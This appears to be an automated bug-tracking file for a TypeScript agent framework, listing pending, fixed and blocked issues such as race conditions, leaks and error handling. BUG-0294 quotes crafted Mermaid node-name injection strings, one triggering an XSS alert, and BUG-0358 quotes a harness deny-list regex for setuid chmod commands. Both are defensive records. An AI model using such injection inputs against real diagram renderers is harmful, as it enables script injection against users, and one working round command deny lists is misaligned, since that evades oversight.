- **validator_completed:** ``
- **validator_notes:** ``

---


### BUG-0371
- **status:** `pending`
- **severity:** `high`
- **file:** `src/pregel/streaming.ts`
- **line:** `204`
- **category:** `race-condition`
- **reopen_count:** `0`
- **branch:** ``
- **description:** Parallel node execution closes over a single shared state snapshot; two nodes writing the same last-write-wins channel key will have all but the final node's write silently dropped after sequential applyUpdate.
- **context:** When multiple nodes execute in the same superstep and both update a shared state key with a last-write-wins reducer, the sequential applyUpdate pass applies each node's diff against the same pre-superstep snapshot — the last node in iteration order wins.
- **hunter_found:** `2026-03-20T22:10:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0372
- **status:** `pending`
- **severity:** `medium`
- **file:** `packages/a2a/src/server/sse.ts`
- **line:** `6`
- **category:** `memory-leak`
- **reopen_count:** `0`
- **branch:** ``
- **description:** ReadableStream in createSSEResponse has no cancel() callback, so client disconnection does not signal the upstream AsyncGenerator to stop.
- **context:** When an SSE client drops the connection, without a cancel() handler calling generator.return(), the generator keeps running and allocating until it naturally terminates.
- **hunter_found:** `2026-03-20T22:10:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0373
- **status:** `pending`
- **severity:** `high`
- **file:** `src/cli/index.ts`
- **line:** `24`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** ``
- **description:** Top-level await on runCLI is unguarded — any unhandled rejection propagates as an uncaught exception with no user-facing error message.
- **context:** If a command handler throws unexpectedly, Node.js prints a raw stack trace and exits bypassing graceful shutdown or formatted error output.
- **hunter_found:** `2026-03-20T22:10:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0374
- **status:** `pending`
- **severity:** `medium`
- **file:** `packages/loaders/src/loaders/pdf.ts`
- **line:** `33`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** ``
- **description:** pdf.js document loading and per-page getTextContent calls have no try/catch, so parse errors on corrupt PDFs surface as unhandled rejections with raw pdfjs internal errors.
- **context:** Lines 33-39 are outside the try/catch that wraps only the file read, so callers receive raw pdfjs errors instead of contextualised PdfLoader-scoped messages.
- **hunter_found:** `2026-03-20T22:10:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0375
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/checkpointers/sqlite.ts`
- **line:** `31`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** ``
- **description:** db.exec calls for PRAGMA and CREATE TABLE in SqliteCheckpointer.create are not wrapped in try/catch, so initialisation errors leave the database handle open.
- **context:** Unlike PostgresCheckpointer.create which handles this, SqliteCheckpointer.create leaks the handle if schema creation fails.
- **hunter_found:** `2026-03-20T22:10:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0376
- **status:** `pending`
- **severity:** `low`
- **file:** `src/models/openai.ts`
- **line:** `452`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** ``
- **description:** embed() calls res.json() without a catch, so a malformed non-JSON embeddings response causes an unhandled rejection.
- **context:** A 200 response with non-JSON content throws a raw SyntaxError with no context about which model or endpoint was involved.
- **hunter_found:** `2026-03-20T22:10:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0377
- **status:** `pending`
- **severity:** `low`
- **file:** `src/models/ollama.ts`
- **line:** `214`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** ``
- **description:** chat() calls res.json() without a catch, so a malformed Ollama response body causes an unhandled rejection; embed() at line 302 has the same pattern.
- **context:** A 200 with non-JSON content during Ollama startup or proxy interception throws a raw SyntaxError with no model/endpoint context.
- **hunter_found:** `2026-03-20T22:10:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0378
- **status:** `pending`
- **severity:** `low`
- **file:** `src/swarm/pool.ts`
- **line:** `261`
- **category:** `memory-leak`
- **reopen_count:** `0`
- **branch:** ``
- **description:** Retry delay setTimeout inside runOnSlot is not cancellable when AgentPool.dispose() is called mid-retry, keeping closures alive until the timer fires.
- **context:** In-flight runOnSlot calls sleeping between retries hold references to large objects via the closure until the timer fires, delaying GC after pool shutdown.
- **hunter_found:** `2026-03-20T22:10:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0379
- **status:** `pending`
- **severity:** `low`
- **file:** `src/swarm/agent-node.ts`
- **line:** `198`
- **category:** `memory-leak`
- **reopen_count:** `0`
- **branch:** ``
- **description:** Retry delay setTimeout in createAgentNode has no cancellation path when the swarm is torn down mid-retry, keeping closures alive until the timer fires.
- **context:** A bare `new Promise((r) => setTimeout(r, delay))` is awaited with no stored timer handle, preventing GC of retained objects during the delay window after shutdown.
- **hunter_found:** `2026-03-20T22:10:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---


<!-- HUNTER: Append new bugs above this line -->

### BUG-0294
- **status:** `blocked`
- **severity:** `medium`
- **file:** `src/graph.ts`
- **line:** `216`
- **category:** `security-injection`
- **description:** `StateGraph.toMermaid()` embeds raw node names into Mermaid markup via `lbl(n as string)` without sanitization, enabling Mermaid injection via crafted node names containing newlines and embedded directives.
- **context:** BUG-0292 fix applied `sanitizeMermaid()` to `src/swarm/compile-ext.ts` but missed `StateGraph.toMermaid()` in `src/graph.ts`. The `lbl()` helper at line 218-219 casts node names directly to string with no escaping. A crafted node name such as `"node\nstyle node fill:#ff0000\ninjected_directive"` or `'node\nclick node call alert("XSS")'` injects arbitrary Mermaid directives into the output. Since Mermaid diagrams are rendered in web UIs, this can enable XSS in environments that render the diagram. Two regression tests in `src/__tests__/mermaid-node-injection.test.ts` confirm this: "BUG-0292: crafted node ID containing newline should not inject Mermaid directives" and "BUG-0292: crafted node ID containing Mermaid click directive should be escaped" both fail. Fix: import `sanitizeMermaid` from `./inspect.js` and apply it in `lbl()` for non-START/non-END nodes. OWASP A03:2021 - Injection.
- **reopen_count:** `3`
- **branch:** `bugfix/BUG-0294`
- **hunter_found:** `2026-03-20T05:23:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** `Auto-blocked after 3 failed fix attempts. Requires human review.`
- **validator_started:** `2026-03-21T04:21:49Z`
- **validator_completed:** `2026-03-21T04:30:00Z`
- **validator_notes:** `REOPENED (3rd time): Fix never applied — toMermaid() in graph.ts and toMermaidDetailed() in inspect.ts still embed raw node names without sanitization. lbl() helper has no sanitize() call. Test file mermaid-node-injection.test.ts still missing. reopen_count now 3 — Fixer should auto-block per guardrail.`

---

### BUG-0295
- **status:** `fixed`
- **severity:** `low`
- **file:** `src/errors.ts`
- **line:** `58`
- **category:** `information-disclosure`
- **description:** `ONIError.toJSON()` and `toInternalJSON()` are identical — both expose `stack` in their output. The method names imply different audiences (external vs internal), but the external-facing `toJSON()` leaks call stack traces, revealing internal file paths and library versions to callers. Any code that serializes an `ONIError` to a client or log sink via `JSON.stringify()` or similar will inadvertently expose stack information. Fix: remove the `stack` field from `toJSON()` so only `toInternalJSON()` includes it. OWASP A05:2021 - Security Misconfiguration.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0295`
- **hunter_found:** `2026-03-20T13:00:00Z`
- **fixer_started:** `2026-03-21T05:22:00Z`
- **fixer_completed:** `2026-03-21T05:22:00Z`
- **fix_summary:** `Removed stack field from ONIError.toJSON(). Stack now only in toInternalJSON() for internal use.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0358
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/harness/hooks-engine.ts`
- **line:** `360`
- **category:** `security-logic`
- **test_generated:** `true`
- **test_file:** `src/__tests__/hooks-bash-bypass-extended.test.ts`
- **description:** The `dangerousBashPatterns` regex `/chmod\s+[0-7]*[4-7][0-7]{2}\s/` at line 360 is overly broad and produces false positives, incorrectly blocking safe permissions like `chmod 755`.
- **context:** The pattern was introduced to catch setuid/setgid octal chmod calls (e.g. `chmod 4755`, `chmod 6755`). However the regex `[4-7][0-7]{2}` matches any octet where the first digit is 4–7, which includes the common and safe `755` (rwxr-xr-x). The test "allows chmod 755 ./script.sh (not 777)" in `hooks-bash-bypass-extended.test.ts` fails with `expected 'deny' not to be 'deny'`. The fix should narrow the pattern to only match chmod modes that actually set a setuid/setgid bit: `/chmod\s+[0-7]?[46][0-7]{2}\b/` (digit 4 = setuid, digit 6 = setuid+setgid). OWASP A01:2021 - Broken Access Control.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0358`
- **hunter_found:** `2026-03-20T14:51:00Z`
- **fixer_started:** `2026-03-21T05:02:00Z`
- **fixer_completed:** `2026-03-21T05:02:00Z`
- **fix_summary:** `Narrowed chmod regex to only match setuid/setgid modes (4xxx, 6xxx). Allows safe 755.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0368
- **status:** `blocked`
- **severity:** `high`
- **file:** `src/__tests__/pregel-nodes-snapshot-regression.test.ts`
- **line:** `54`
- **category:** `test-regression`
- **description:** Test "parallel node execution succeeds when multiple nodes share a superstep" times out (5000ms) — regression since CI Cycle 8 (all-green).
- **context:** CI Sentinel Cycle 9 detected this test hanging on `app.invoke({ results: [] })` in a simple parallel graph (START → branch-a AND branch-b → merge → END). The test was green in the previous cycle (Cycle 8, 2026-03-21T04:11:28Z). No changes to `src/pregel/streaming.ts` have been made since the last green run. Possible cause: deadlock or missing edge completion in the Pregel superstep scheduler when two parallel branches converge on a shared merge node. The `swarm/supervisor-routing-error.test.ts` worker also failed to start in the same run, suggesting potential infra contention, but the timeout is a hard 5s test timeout (not a vitest worker issue).
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-21T21:30:00Z`
- **fixer_started:** `2026-03-21T05:12:00Z`
- **fixer_completed:** ``
- **fix_summary:** `Not reproducible. All 4 tests in pregel-nodes-snapshot-regression pass on current main. Regression was caused by stale working-tree changes now resolved.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0369
- **status:** `blocked`
- **severity:** `medium`
- **file:** `src/__tests__/swarm/supervisor-routing-error.test.ts`
- **line:** `1`
- **category:** `infrastructure`
- **description:** Vitest pool worker failed to start for `swarm/supervisor-routing-error.test.ts` with "Timeout waiting for worker to respond" — test suite could not execute.
- **context:** CI Sentinel Cycle 9 detected a vitest-pool worker startup failure: `[vitest-pool]: Failed to start forks worker for test files /home/cerebro/projects/oni-core/src/__tests__/swarm/supervisor-routing-error.test.ts. Caused by: Error: [vitest-pool-runner]: Timeout waiting for worker to respond`. The suite itself did not produce test results (0 tests reported). A similar ghost-suite failure was seen in Cycle 7 and resolved itself (stale cache). This may be a transient vitest worker pool exhaustion or deadlock triggered by the `pregel-nodes-snapshot-regression` test hanging for 5s and holding a worker slot. Could self-resolve on retry.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-21T21:30:00Z`
- **fixer_started:** `2026-03-21T05:12:00Z`
- **fixer_completed:** ``
- **fix_summary:** `Transient vitest worker issue triggered by BUG-0368 test hang. BUG-0368 is now resolved. Self-resolving.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---
